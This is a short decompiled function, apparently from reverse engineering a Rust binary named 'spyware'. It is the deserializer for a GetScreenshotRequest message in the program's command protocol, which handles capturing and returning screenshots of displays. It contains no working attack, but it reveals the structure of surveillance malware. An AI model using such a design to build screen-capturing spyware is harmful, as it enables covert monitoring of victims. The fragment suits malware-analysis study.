long long spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::GetScreenshotRequest>::deserialize(unsigned long long a0, unsigned long long a1)
{
    a0.deserialize_struct(a1, "GetScreenshotRequestDisplayScreenshotbufferwidthheightGetScreenshotResponsedisplays_screenshotsMessage", 20);
    return a0;
}
